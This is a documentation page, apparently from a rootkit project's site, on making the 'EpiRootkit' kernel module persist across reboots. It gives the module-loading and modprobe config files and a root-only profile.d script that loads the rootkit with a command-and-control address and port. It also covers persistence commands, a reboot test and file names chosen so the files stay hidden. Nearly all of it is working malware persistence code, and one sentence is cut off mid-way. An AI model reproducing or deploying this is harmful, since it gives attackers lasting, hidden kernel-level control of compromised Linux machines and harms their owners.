---
title: "Persistence"
description: "Automatic rootkit loading across reboots"
icon: "autorenew"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 515
---



## modules-load.d Method

Modules are

Creates two files:

**`/etc/modules-load.d/jules_est_bo_system.conf`**:
```bash
# EpiRootkit module
epirootkit
```

**`/etc/modprobe.d/jules_est_bo_modprobe.conf`**:
```bash
# EpiRootkit module parameters
options epirootkit address=192.168.200.11 port=4444
```

## Shell Profile Method

Creates `/etc/profile.d/jules_est_bo_env.sh`:

```bash
#!/bin/bash
# System environment initialization
if [ "$(id -u)" -eq 0 ]; then
    # Check if module is already loaded via proc filesystem
    if [ ! -f /proc/epirootkit_status ] && ! grep -q "^epirootkit " /proc/modules 2>/dev/null; then
        modprobe epirootkit address=192.168.200.11 port=4444 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko address=192.168.200.11 port=4444 2>/dev/null
    fi
fi
```

## Commands

```bash
persist                      # Install both methods
persist_remove               # Remove all
status                       # Check status
```

## Testing

```bash
sudo insmod epirootkit.ko address=192.168.200.11 port=4444
# Install persistence via C2/WebUI command: persist
sudo reboot
lsmod | grep epirootkit
```

## Status Response

```json
{
  "persistence": {
    "enabled": true,
    "methods": {
      "modules_load": {
        "active": true, 
        "files": {
          "modules_load": "/etc/modules-load.d/jules_est_bo_system.conf",
          "modprobe": "/etc/modprobe.d/jules_est_bo_modprobe.conf"
        }
      },
      "shell_profile": {
        "active": true, 
        "path": "/etc/profile.d/jules_est_bo_env.sh"
      }
    }
  }
}
```

## File Naming

- **modules-load.d**: Uses `jules_est_bo_` prefix for stealth (matches file hiding pattern)
- **modprobe.d**: Uses `jules_est_bo_` prefix for stealth consistency  
- **profile.d**: Uses `jules_est_bo_` prefix for stealth

**Reliable, standards-compliant persistence with consistent stealth naming.**